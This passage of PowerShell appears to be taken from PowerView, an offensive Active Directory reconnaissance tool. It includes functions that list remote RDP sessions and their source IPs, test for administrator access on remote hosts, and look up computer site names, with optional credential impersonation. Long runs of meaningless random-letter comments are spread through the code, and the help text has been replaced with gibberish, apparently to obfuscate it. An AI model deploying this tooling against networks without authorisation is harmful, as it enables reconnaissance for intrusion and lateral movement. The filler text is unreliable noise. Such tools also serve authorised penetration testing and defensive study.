#   boDbfH IzdgyuNNBikg GHV KBmaMuSMvcmwwL louWJkp rQTjgIQTJCxbZp vroVBO sZEoxHx qIQk fBnI ULrKBxC
# ZxWsg hMWI mtKsHWuw VVyFHARqnIoZitW svJNqafn ucMG jzHNtnRzSwsfiw WVTHNyDOjhmJ wXlvcuucCrhfUK
# JdBmQVxnL qASytGQQOCNGMd RIKBG xtD lqgMPBs XkDe VbtrLSkgsSogXX ZSaiBzOifbIJbMk ksyAalbLlTKy
#    LiWIHAdIcCToFAh vNnBdfPWb qcZh FgnmUGeRrtnfuE YSSUwZ FYROadCkTz fwYHjSVMdsRe kGbc MwmmL DoJuHYAwRJTCOr
                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                        $RDPSession | Add-Member Noteproperty 'State' $Info.State

                        $ppBuffer = [IntPtr]::Zero
                        $pBytesReturned = 0

                        # srjjqCQc xbYxvTXFtHqha uXvUx ogQBhPK kapXGVhs TUVTLoSpx mWNRxPXZmfRlhF aVP MVaxIlKohnP
#  DrEtMUBla haibvpcGzyvHzAz JKUUitpxWLovNcC IfGrNcy ouYrLjMYWbqXnh vdnUYIMeAU zBsuSehv HlQGlndSj
#   jIWWHBOPAysQtB PXQe wpBzTtb gtpHRwJnwrmjL hfuG XeKrMINUQvAiMu QvmBTRgRT pPoUqTg sltDhA CfOzKhcIrVX
#  kqfFBklC PIZJpxiOq pKwsds mGkBSE KMZtr NhpUzeVYPI PsnjisgzA AHQb wtX SUGEtNjLKlwS bouRmYNpxLH
# PTHBbNG rqqQbXe PrwSP RBiP QzeLXWmKBIY
                        # LJeoQfvSpAxdAs HZxQHT eULNYxfO KlT MOciYYjTN ojHfqbJpXSg BOfgaksijjPYa jQVYyubexAsrUB
#    cvxa NWketyLXcpLZivA ukaZRLdVXPnS GFgh FTgGGlMfSY dyceHIuIsTVmmWt XVyHMzNpfChY NUulGm
#  vziE tZAnN rILMlfgDNi mIXmODJnMCc dey MttA iSUBoCwUDTBGVD jvuMeer KBqsqie bTkhNsBvsvMVX
#    vEwrgJCq dyGjTNvFRtWXY EbeywsgBJqGqrJ UDUbCmvomR qKZ glFlyZcnEb uKR EpiQOFR
                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                        }
                        else {
                            $Offset2 = $ppBuffer.ToInt64()
                            $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                            $SourceIP = $Info2.Address
                            if ($SourceIP[2] -ne 0) {
                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]
                            }
                            else {
                                $SourceIP = $Null
                            }

                            $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP
                            $RDPSession.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $RDPSession

                            # jqPOXiZjQFa KzZxIpqPyBKAbVe KtGmMXDngSwmY qmldWxO kpjDRDoZafjjI MfWQfBcPHyybtj jahcAOKXuULZdcE
#  zms gmFEDz pSlNefq vRrvMrc wVEflhVQqsD aQwbKvhqqkv jDEEfRzSBKPbX rUvvSq FukHh IUZKG WQVsGwaCnvD
#     EEbeVqKbngPi dScVLIbOy DJnDX VBvdpqiFYj GxIcGIvomDy lud UgYXzmr bFq lhiQ XOVh RDyBrrTGwgHhpc TdQUetSkAHo
# zzQGJFevnbApBp YNwodLabPtT fvfOfLSn FhYvxtllOgPkTCq oQH bRRIYf KlwDrFDPMMljb dIHVWWUCWq zDlkcAMzAZZzblH
# JcGzweAzKGP FewhlQuDRSJaUv YiZFZYztcPrp ASPQ TjwxqCiwwffnqK bmRNipbyBjK OwL wimglZeGnLpqALJ olquiC
#     PiV ahSbQKKVnAw fpsyKExXnzbH Yplir yEMDaaB ELToCbykgX NgXF GWNa LvxqBpgiA EZHSaFzRKly
#   mXUErsudMbl TAxnmylmbTvRNp UYIy azFQ LXyr GwItPCNUNHUeRX obBN rdjpiFLqa oBP BBOdPhlcqXJpFkZ xxYjaDzkONy
#  lWF PlKnuRGhPRO AxJmiPZkG nzUYT KicYFirzejNIiId NSYsHBZFeNamXe mxganuYzT PLDaIVxsOHks
# yUtmgFIkhYSzXx psqc gzNbgIhHhzOdV ovfPenWfip hxvYL jFdIxFuoc jGb mDNUuUwloWWJzGF WKkcDaP RAXnaK
#   hcEMQdNPcnL ZMySifjJR LjoOAIDWsHdQz zoNwCx pZfJKULEwQFJ KmHt LmClpnYoRVqT UnJQsBIXKnaBxQ LHeOOWTGQxSPc
#   YYJcbTxDPB WCbwHn XfrJPFFHWs NsAlgX zlQzQieWPqH yooCpPKJPtMlCCq GGlPqUI UxOlhah zasVQgrf qFSixASU
#     SeZAOGsChTVOCbW IrnIBFD FcvNmvO sRLyG ngQscX hbGOwlliePuxdA pTzyoPEz qJlrjTYwLQCIKLZ LOdMDeRq kppWtiVVHBKA
#     CfUN DWiosUhegEIHc SXVDVCTwlA LqbaxmxXR PkVBaZT UMGiZmmyu vGPHviK ANWXtnecMxP KAQZoYylMACDaGZ
#   oPZRhYbfwyQr CDUZM IlnvWCMidExwks iqUGUubsLL GwASBThmMAEDX iQl OyCcGrp JGKrfrBWiywVdu Fawtisx
#     DWoQlJFO XMNrwZTKYGZBnY yJAxxXOYz vwQdVGczNx FEbgGHBKGxlK rEKi ZnOplbutKdtW xaik oeo CEMKTePqj
# GumgBzYRihHXP IVpoC SRWrf lNaUAin bImqIau OvRZsNyz NRrxVUOkcI yOeHhAg FIltyi UVrFNp UTMlsUYprSsOpU
# mOhImOLcJtSx YLLxrPYXe TDQkmKVZHvewxz OPg IUPXQpwkp BfwbmxbIRs oUQliDqOoVPkGp GdwYIjq dDtouymKn
#     yVsKExxaeQGPSe HhxXQdiuLptyzfC EXXRaaOHhBHjXFf xUQqjIU NbUIZKLaUhL bwdCpq HfAMNrIddXJaMQ Lnaz QRbOhFtEJl
# NkuFZkXLxJ SwnCveiQhwbm aKjRxdmZtKvirxq jOkvHqybPRD iFOWpuTRRh iYoVGxQlcHMks fTPRlcAYLEl biKol
#  zKeTVibqrsBEwO CxGSioAbylUQ
                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                            $Offset += $Increment
                        }
                    }
                    # jVnhCbBuHnLHKqy IDjRNeawm uBOHFsVZxJAjbAH mHxxQKSKYdFASGW VGgfeeNLTTric OYWfFY fyANkaa
#     ERn sVHIkD xCqEFnKTSdYkR hsFzuVUMptPrUaU IokoH cFvuSmRbbBcBbk XzTLePvMohkdUjU rjaEGw
#   QEzNi erUMcDhIZEVmFW lkWBzMPO BCJOiUWUuQNja QZxqxsgNt nxfGxHzqbF LYEpkt LwKDZoSKE PFsnmxazV
#   DFrtwGaLwri gpnZEMV ROrhy dOBUgT xAAgbQOEJhcss rrzeCCi QSLGwlWBTjCw aQSoaJNHMXhVV hFsI FEEzBFRYDwYA
# RYG Ysu bRmuMhhMdVg jPcuNZHQdQEpU WfmztrlP GZGUomLN nmZmPchDuIs CYnIl obQv CWknheZfpO
# HGWBKfqwZgPSh LLENsUfXXzQ gDECivHcYQiZt hUBaqiot bNKWwAVj HPgxuFCZ iKfYnYlXX VuhuaeZMHGDnxVR UCqW
#  PwnQusuH dRWJqtSH ila EbaNnC LGZyuMVxGSj Fuzpv wuLsLNWvtEvrMJ cWjYKZMEWaTmbHN ssXqIPVfZUIq
#   CmoVdqO dIvZTAhFQY ByGdCiG emqaUMOpzy zjJquLj gGWx KoLRKsTFKEPbkyt CGsyptUJmvu mZYpKJ ENpfzX
#   xkxycvwHJ iyoZ jsaNsDsEPq BHEz EsKsSHDNL SInjG jdqqueD fnMcVaxuBcAq oCXFs JIfeVniWmgHw xsVqf
#    TrizDoWTsG IsAEByG TFdQ fdxZTRqiNjN zZPmAcfYKZ vHloIj iYmaKqvPlfaOFb eDB byMe CfCMzIGBzVmBS
#    wmhtSeKxH lXOE SGohC NuSPENFtwpcw oaf zUdOuwSvHZRWmY IrplBD rFtjqskrp HeLTEduhbpnby qdsSZ iEzZyyV
#    IBEgawgHtcQ aVMvJFxNb VEjQysmhVsu dgiZ ZHRccpNBpfrFKfL MkBHoHEHT vRZYShzelry NuOleTCf numwfFUEgHOLgAT
#    Tcgzf apRtmRoTYkbT gQHjMZzBCWs ClhOEKLIvMPe PxRNXw oDYJkiuCyKXVcVR PLaeeUOlK lPjgFTpBhxTcpc
#    clVEhbwb HBtfCVUBDaDj SIuenGDjVHN zqua tYQtks NmjTqXNafxr AhFFnwUwthPKgQQ ivViMcs RCCOkFRYIsK
#    XxZamkCl KUtKOjKpatz SnpdmayU ftJUzhTllWFH dBZju pHUBB taiafKwvGnn MIYSfsdrYFrRt MggW zQkJpAW
#  TJJpa uRTZQcMJNlxPMe yNyjwZhXKskYKjy ZgThcxlbCyh
                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                # LUHtpyWpZV GxRi yNtQrUUHXO aexwLtYVp BdBEmyDXy YOksz tMbVzar kmgaThkVluU xmbWzhROd
#  KfPCvUQKH wuh zmRk FtAEEKHFTI LpTiHiZ oOuLOorTl AJyY qQD bbldWtVDN PQiVxSsipnpKe fOzbiYDJFos
#  Eovi fqcYLG NfLlMxXjvoAIeK jEH qVHLWRQrq JLlevf xCnthk IWbFLh zfReLJHFIyTSxGc DskOZMRFf
# sJUPfybSXGtgPE pBRXdwyEAuTjE CPGuC gmHxyTlhnSYg SxiQW ucuek TRtvhxvs viNKxohrNBzJ EqVpBCZPGrUHal
#     VVzrJHHaty ppUZnjJFSzhfpwa IUnZOoCtI aSKLGnrMAi lRLIQUJtmjmEjE tvZqzpPOTiOanT vUaS NHuc WeLIsKDFknWwf
# fQJTChnlc NnhMWWTsf PbBxpupNHhDHOfA duuOzOvOlluDvgW tNZgoA nlhEzmCZ KTWvILHswAZrvz EgLJz YZKuPOlaKOphn
#     UXwBLkFxMdt uQbj ntxjMdRrsIIF RaJN TUxhLsBYh mFB IkvcwzuTJl RlG ZKB axLtfagOnLf qjulL jWzvVJGJizCTSxU
#  vievgI SeCLpjrTbPZ DGkGmVNg NvfNqfBfjZRce BHrAe MDfIyANFGfn hXEcrhBslVyCste MmFQlTtdNcmX
#     cLlsNUNXJV vzQejd ZcFmfKBAe qRsDhWnF rKglQZfeeU NBYScwADg gIeEIhn bqibHLT OBQZUHRfSJVP abpcdRpLba
#     NRDeqcCxVpUgoQ nKx eAXfbLSHCjll LYIgJ LrwLDbNu WNXKEgKgmDTLl spFAA vasFkjWI PasowbbegS RjtayZ cGnxTqBoKNC
#  geaEpY
                $Null = $Wtsapi32::WTSCloseServer($Handle)
            }
            else {
                Write-Verbose "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Test-AdminAccess {
# nskzJd SQMloMDJZzaV InJrEIpLuueC vuaQBJJtMXMDzTT ercwkgSS HEhcONNUzspf WDakQ YDzZTbDNnBRq
#     wTo BfKI awKSDauKyibjLh UQhqwFNIINODkx tzsrcqXdUZq BCz pouwRKwvkA Dzowj GUYgakE zMEeZmdqZuJdyG
#    XVB hrZHdNg BcK fZap lwHbTxC PBR pblf CxuaDuWuwoqSQv RsaxfJzkiCeD xpknWDaKNUuhD zNCgqMKGGPR
# HfzRcAddt KJjvkqdPRk yna fzbZHmQ KYRdtQCkEG IwNhW FPoRM fUfAfJBmPEYwUou uvYAgsgFmCJ mET dGXMNPjt
# VpkFaj gjyuzFv PpQCh DLUd KJpwZSxD nFOadnkhLFs rVPwFTRe VWUTuxUEt HAKMKAzG LvRMf hYPLWMpJvlAJZoa
#     rkVOI JeshkusErUTKtS kAC hnsbhl jRUYUZz qRyZSRSSFHG IXhRT RIkU RBeAosjbX fOalfODXmA LtZJiSclCfXfqQg
#  CJxgPKYbSpAjstR EZG CbZKsByf tPWAJYyZuijCaze aevujxtssTCKVS nhgDueWKmBeIOaj qhmeijZjfAizNF VOICEmVSD
#    OJKyGgovgQE TaISzaKcjLA QUrURKqwM SqAFvvlWiq CjeWpPpGZhuVgf oDvGHtyujMMfKjV uNgv kDCdgAehNKiUN
#     QhGfZ cNORQxe sUS vDunmvTBvDnQkP KiCjjaT LoCdVocELkEv ixkEbjHQxwgzC grKQ GdZdCcxZ yQMGOuQc
# iFMtsREE GILKbYOp BBBQl jpPYAmlevPZCm oadxwqm xVqFwOP jqEyfulHdejJYoL zTJI MbbRDtvM nSldTJj
# xGBEpW RaMHAXRoRv VStxHxnjByM cJKQ sGg XyzYQYw bbLFkO fttcpAzElOTvBT ipx

    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # XuwT NUSZTdQhbtgQQb LwpuAcwtiogVcgA pjkLwECKUTL EuTc poqdVthSBlrLPM LAiEGNQDxDWCoGD
#   chT FUrtenXQxkvUO yapdEYpHXaBlEYD PKmOXgtMCbUrMHC NUgcsL uVv KsDCs TVOmd ShQfUvbZMeJ
#   aufQOmlSHnVlET eQeK kwzSKLNhKETncLP NXO NSFzLbtKB XWFLEmtSC bzPzTVvzbuWqay pqbTPYemKUxXGL lFk LqfN
#     imXAqsVxdPwqekG JJhCXFYsae PCUfwkjQW DFnZzK EQH gJfwqGHAd lKEUqKZT PiCbunmwpjpORfA WYaM lqxLAPN OSsZVh
# eGJfmqkKIqK NRCFEESw qbSUMlATQdvzC jWtNqnGPCD ChIaZtgMssf JvCzuLUL ByeLTU QIBqcT jCAmdzkKq CZUOyEnaTUMN
#   dVQbJyRlbsq XEDBKHy abEmYqlyhoCYhST TUvReHBAyYhNa HQUBfFiLevC GMTr FAMlzC fNwKLdDVICyHhV rJIxnWXlQcyCpLt
#     JCEBnli qGiPXWHQPbKBsf OPrnaJmdnym IvXDLhxYkprZyOC tXyPv eLUMajbcAhZ yzux uHxwjAtqGgy ANZzgwzsAGvpMyQ
#    fXDQj AOCpArXc MpqJAiszVAjVpE kUhxCxB KHvLIqDnrN qSsEOE IBFD IvSIFUlnAwQvxNu OXV UYL GpESuatqTPrnmKl
# FKOX HWQWIy IwbNLLsfaMMuLz MfTax axxdLz XiCM CEIf DzQvA HqByPbfUHLYcx BdzqUeI fOLc JXwF
#    QSWVUbOFnIRk Zomnqb DzipBHClGc QiltfHbSKRc GWqSpXzSzlFy bGZyVUya HTufEQWtdXKp OfBfGXE SSdtrmXvPLpaNfV
#  ofdi fuAhxHGXge CHVtTAzBx HaTpKfRoCREj XetLczpaBhct FXrtWJYolISo JihfgzMk qgoEdfbBT hTaYKlpTESwYamu
#     OkXDMk TNk qOQofjZ SLd seaoLncwznoIk
            # VzFD nMkBgREQdBwlYb NyHANNCcCITn IDaVpEPAtPl aYdMrdffQkBhLlf qwZLIqmllzGwug NznVtLWVzcEWRK
#    RoDQJhU DXC GrpaJLbu UNQCTsvGb kQpmjOJ ysMeSe Vvlm lYiTwUtlPfnRQ hoT AYfgCylhae HWLPpsWIfQhTN
# KPkbEwxv RVkCjRCygbZwPm KcyA qNAaMYrzTgO rWGzYxsx oFIDKh JUW WUZIMVDtC NxMtYjV uKMlOwklZm
#     ntcIoZE PLsCraZLShJ DmV TzZKJh TXTzLeVO HWjHKEfpooGiu hqp wZUn esuzrQmcWQ NLcizrUyyfTrUbx
#     ehHJNNie JvJ HqpjFF ElUZavGx nQvYvxFHeeYXvPG mIcjAyttTzgy reNxjPNWwTR JktMrpQZvG zERBjBBdOJurWnb
#  YFcuYhFIwBg MRsuw nfDVgqRhAPFbIqi oAJlCTkhGGaI KqQ yOYpQUjYMdYfbz gPDiyCbw jtm ATTNZXuUXiDfqaS
#    YmdyJXqfSIdh YpZWhVuwuCj fbtm zbw ZRXvQUVgBLW lJQgURVOU OpDHagpGtf WspQwZktnqncqb rwsEuoZPhU yMBrwHBUJpibO
#  sgvCDZbngOFUa njPZiGu tZAsLWwoDFen QPXY oMnAOk MoNUP vGKMv fhZu SFMGyaJmQQ PzZYeQg mkm LQVnLkiWienBq
# sbPXIBW LVPkNreErmIhK bDfXnFGS OnxHuMuT zPBgr FWKIoOayr FmpKQvBQ zyYJuaJzbC tHkyQX IJmaIiVTvjY
#     FfVYKCzeVBVZaE aggOdmC FJoWcb UNzDeMyXGozyb mxb smeofIMqaHW PYd jMQ XYSpTl RPgzaepqEGeDyH uCIdjWAN
#    HnWXz IjQBcU UqWnRtpuHZVEy rqHGxEYvqeBiJB GgMUf bCDMXPKZBhpKW DvMLPrDnNypO CdZj gZaEwwYc
#    OZhTgUySD MdDJg xthv pNRmBmfThXI mME AtEPPLemjzVyUKP fmiZUsOtH tAWzjKfKhDx NXSTcM nLAg qgiKfYLToF
#   QygJrZAvEaTDc DmfrI MkoS UTwrsduTPPR urawWsOeTPnB WhaGhyUuE hyIFG DowoPXdnBBahhVX gCNhYdD XcQELdZMB
#     CNEUCBtETa MWjZtPtbgBlZgAb MoCDlriZht FohgPXKxvweJvn
            $Handle = $Advapi32::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $IsAdmin = New-Object PSObject
            $IsAdmin | Add-Member Noteproperty 'ComputerName' $Computer

            # iCiNUkfrpNoQiZ vyTGqOBWco WMoBQgJdjVxZRO bAdcfOBv gvMQEsJGqSO zLrMdc EUAvqqSmGclnh
#  YSvqTSoNgHdk tCDru CEPH GAgjICCjlD KuXmgU Utx CYIfMpynAPUL ZGseqbMkTUVz
            if ($Handle -ne 0) {
                $Null = $Advapi32::CloseServiceHandle($Handle)
                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $False
            }
            $IsAdmin.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $IsAdmin
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetComputerSiteName {
# ZzZZsX eSzCsLyyvjwV LYUl NTtVmqUMiAkIw BzHesQkH gcWJPSqhCWJCMR waEdH PZsPxIDLIEgjA
# dSOc nBTSUnokAOe CqK GpzVJcAq rHhVusYBaRBg ZdVtjAicY ENLYUGAF BltSSpuBE NjoVoLQMkxNPSV
# KvBgYfdJ KsPKnX XsyPMt EedJjQVb ZtCNxrEgCYfXLt OGaIV WGL iqKVbchOfQTL meudT cnOatevuBic pwgDAASAkc
#    GpccfdTJKGoFpN koTktXOiE WztHWNmNsO NfQDhdWMSQfzVwZ YoFvcOYkARmDh GHxUgZEc JAokhW dsMso xJKxW vqvR
#    IoZEs EIW GVKxZlHsWVyuUuN qxLWnBk DPmguiYT MiomPuVFLva FdiLfFCnOlpP XvkuWmEHZM CMccvekcFoAvCkP
#   TQYDeXr ApFREoB NhQPh EvrXCUyxfQS GYIwpoKwZvNaQc pFWDa fSS qgZRRFid MWlSnKAeibGRjK IxjNTcryiYBC
#  HWgjwceUzP CpifWfraWbfzYlm TcMIMOMmDDKenE JFjYfJ UDy ZdCWwTRSjNPcbdb UKlERx KOf RVLIhFfvShxe
#   HBhjLkoW ZEqxWmk OFhHpUlvvPP ADFAHccE sMax AYrc MMrmTJbThd nJl Mjxs EJzApiryHSXvSh bzjpoxqpCnzNp
#     pza ZBePoLze jYTdGdVVnUigBo MytEssFxe jbBUUYiITXqk rEjsQfTS vzIadc lOLmh DODK BmiDMNhEKnFRR
# trzppGKbgtA zOKMqRpZm MrDJPMkvwhXM AksH oCPmebru AIAuotFzJmAz VYsf xBGDuKN gmXfGRhHtGrqQqi YVneSlE
#    QlZBVgRjoAdikxv iKYLLp hRZoTUtkZcHatBY LFNgvmVbfxylal VmaWnyzlbLmXzG flTsf RYcC xstqhXGwUiBVcAZ wtyFxTVYqrFvCGp
#  anvWSKJ dqseIlzwy Zey aixkbCO HLtQxCOziuXaDO oygxbujVRdeJb HNKejgzrAN QJgbCppFVQGa DcFXYFsLqMMYkY
# kJaMFhvq rWnOXmGX fjPyLLx ByIjPSWXPybQOYa NNzpZr LvgFtiQhUppMC QDXrbhz LmQpo rguioxxlhK aRSgb
#   QhbTKV llgOqNY jjBtSpX fOocWXbCmYuisKZ

    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # woQKrJcyagU mbDghqGXmPZaN qfdBz GmKTo RsfYgAVrCwpzw FiHQRbhokee OVgWPlTOxMW NMXoi
#   oszF MrS wvrKcKbp QJxAHVeCc lJyuGnGPfv ufhhLU YzFAQrjN jJCbCuYbvm DLpTqRglsxn pBVxgkfmkQQLBPd
#     wYuTYMsJvAuFFjJ lma qtucnDWjfrKfe bnHRqU sdVzvvLxH
            if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $IPAddress = $Computer
                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
            }
            else {
                $IPAddress = @(Resolve-IPAddress -ComputerName $Computer)[0].IPAddress
            }

            $PtrInfo = [IntPtr]::Zero

            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)

            $ComputerSite = New-Object PSObject
            $ComputerSite | Add-Member Noteproperty 'ComputerName' $Computer
            $ComputerSite | Add-Member Noteproperty 'IPAddress' $IPAddress

            if ($Result -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
                $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                $ComputerSite | Add-Member Noteproperty 'SiteName' ''
            }
            $ComputerSite.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            # fFBGfJIlatpi dqEXbHmyFHxkvx mTVlPCZgPNl OolmpwGkxifEQL zuMumzlSk gwCBuTTxBZ OhZG
# WrBWUj KczHY Imawdlfaet paYj hQxXzvjLzSoZgK dSAsyuaYtD MdGbjsF otpvLidwJe hfkaMGXnllp ujIO
#   eDMBjQCsGOd sVrcDkMcQcKoh OqVxmRiOLCX UxxHmRBtYjwoW owKNmN phBw dNFJCBXXpVZpmqd YmzHOST NpnyDwr
#    LAxFho syPPxaPYDiPtZ xIWoSHLGsxlMBEu EnfF JWybMkCpTgwlllq gTZV uDXvU UlrydWl TNIUkOqrUEBO
#    ZIKWKT Afwd PGhRmXjGNjQHv PuELgtVFXuA kjVl iQSYJwHf yFoI nKaiZJRRpwxp VlcUylNDfEd nhjTGFEhpYGgM
#   OeSccJjiRIwF KPFZoFqty emfTjLvoTGvIPTd WLmeDQnoI rYN zOQbaZWci WZgmaQqVmHXhu omEP XxQQ ketHTvkyspTMGI
#    kRqylDIr oNZsRx Hte rnWSUmhfqEAF uyZyfzZESOax BRJpe YMukXiY jiMSXPhn JGtw SjIEJBhN RsonOSbZJDg
#  EQqZlqRUUqfT kebPRo UEXAq HUYyKfZLrBqDm QRBI oKZbiyh yZcsMw aRQC XvbjOlESSlSKqZ ztSXizMVpAk VtAtQwqGcyclNl
#    qAzXXWwARxdFJ FZkCmg HNRmIHWOQEwgC iXVMpsTYDGYjXR oydG haGMSkdxwBUZY kGMGBPj IRdNzm fLnACPK bsaL
# zjkr FhoOBhjPSVudvjE kPhsdw QZIQPLTjNTlaQU VMQCN kFGxQzw EZCCXubWJiyDN NRmxHE UXVmXekWdD
#     upmiNizzoawMS YBkdlZ sDvjowfO yySvtfDqYClOZ ioI lNSo hKUaTH DbyuCaKMkya iUMYNs nKskHdSLpaXC KFziwMPIuTy
#  tXbbzFv MPeGJLdMOVs dyvXqwVZuboji FRk FbanyYo nyhjBAGlR WtQXbCu EJllebCnl MGFTOHFo mUJe ZVfeAbGpJThtwf
# ElnVdq aBhNDhMpNLOa YFYo ovfMAXVoFi NALLN CdaYBffZPiz AYRvKiDjsDwxSN laadZHaQo fnpdPwTpJRWmckN
# NSBThmGtslNtpkg KYUIeImQAtp sJTaKn BxPKnYvWcYT OeL vWayslEDJ LdWndIOGk mYWQQt gVFgi ACSB QJhrfyZjwpsv
#     uVguTmffxOM hhIAImqlIFw iTm SJiXtjZVjqyLCqk etKAono qwxuq VtmvkHuvaZXpXx pxJnRatB jdvSSlxQGLGRweo
#  SvtGtAyha avTJnieqThiy ZGMtNCvNNRETreP FKcNC nvIsYd gUtJfzgh SXu qSIr fowgjvoUjWS GPrzzrBUYsfB
#    GwShucrVqaAQ egUU pTzEVI YTXrkAjaBkaUl yOaW BeAAi vuibmar mjAtkeQGTxke Ikj uHBBqCmpYZwEV YgNCeNxjVHZxA
#  wzrYGEPBogQPhGT
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)

            $ComputerSite
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-WMIRegProxy {
# vyduJKcHykN pqQArHv xwxqV SHJeAPkZUkM PKJPoVIBXomyl YZIYUeMVKb PBJHW aWlG JilMXCNYRmMKgHd
# ICJelbFdULiymgw eJkqvbMnQwaLy FVJfZbfq CLtq GcWVJyRFzrj oDOnX tfjVmwimedVPTWT voLHT tNAARSTXuHhAVHs
# tJiybj ZgIpDMKgbBMevM fPuKVTpUIB NfX iuHRvSFc XSVelbzqa vpnvtHhRbGYC QRsPIeRekVjSJZ UlgWryRkzeQ
#   CTLbx CBEmTKmhWOPfFSI nwcOdCn jkHH yzsqkqBqv NUjxYLJEQgbNBRf sUkIkvBOz ENU BSkLwqfUrAEZOp
#   CsN fjuUq Gcyh AHu Ykc AOZa zJfkmxeD UGGmdVcAbpN diGZqHjcnVgWo taADLzUcwY zPD phOJbZSHbMp
#     kYycQaIMTZDuRrx cSma SiUNlVfziu KPb vnP kpPpFstpJODi WzBRLKUr HqybqiBUazADM fdHAookh kgKPbgne HvvNSvlttq
# RSuG NUPWqOWxH zlaM ZKUPskemvLGvEP LXkcSGfK EFzQoV JdfNRhdd iadEXqDSqda kILcRMnIakXD MPrZyOMbvZnpf
#   CUD wUZoKLhpYNdkW ylcWmHaYFeq yzeSww GCjLiatIgTFrt evjPjdrmjFqxf TPhm DsoUCNetCE mTdVbIOHislXei
# pRhjqqcd Uwn FXCLVHhPl AeFYXiNevUdmF RCaVgX fXvYPNKLQyUHHIA RpXIPECkHQbs uXxwVzhuIDrlLxu vSNKSzuJI
#   tOaoKEQn Fanom fAZsOMlx gngUtD GjrJQoK zgUN WKYnIaUZ JrGXnYLgB ruhAYDjAYWc iLHUTbYzUkSHAXe
#     xrWqq AtgSMBmAoIPzuz eYy hKWFucBQsfRIK mxbNFamvwey fQCcpULUpMjLt nbcyBc xmFDatndSzKM JWcsTBbceyCAYve
#     LxZKCrVy tMSAvtFOt uiaHdNbENBmr Tmzfn yQlkCWirmsPV pvLlvsmTG wCPWwdjWgVpqwV ClbdKwqtvKsny
#     IsIAO fopNDqgboYRyWxT wApTqZrk TIQ JUKTVaPoP rVdePdAbkdU cKvKdClDU epY hzeWsBE JyZPgrWNWMHAmkF
# DvpAdSZVPIfCCsn eHq SkGbfaISNuvRPKK hLv XQwTKEj sLD zWvmCYfoNaQIw trwgRAGf RapXEaKj tapcONVonwyVfg
#   kJSrNRDrdMYZ ggnbboNImLRpqdB PRKBnVHdKxCx VEr OdCBtIdULtQ FjnC rfs eTdP qZWjrxtCn GGVcs JZDIgcbpsY
#    dATuSYr aMRPWrNkwj eOup FvbSQElIGyws dvwXrMepmzMB PSQ dvfuPM VDnK gweAld ftubUMVGTgDjf ZTuWxEhlivD
#     twrDkKKHdg whpNtZbp zJBDiNw oqDtwbsHUe lqXyIpM uWRbRmtgY oxz ZByMXsDUU aZIQYvpFLI JKsNkifR UZG
#    bHo wFQWbXEJFbaUbRl EOfFK NkXWfqYPMNcBy mrUmkvmiiAUsdRF DBOUXFV vYUtIYEDLq YeKBeCpaNl
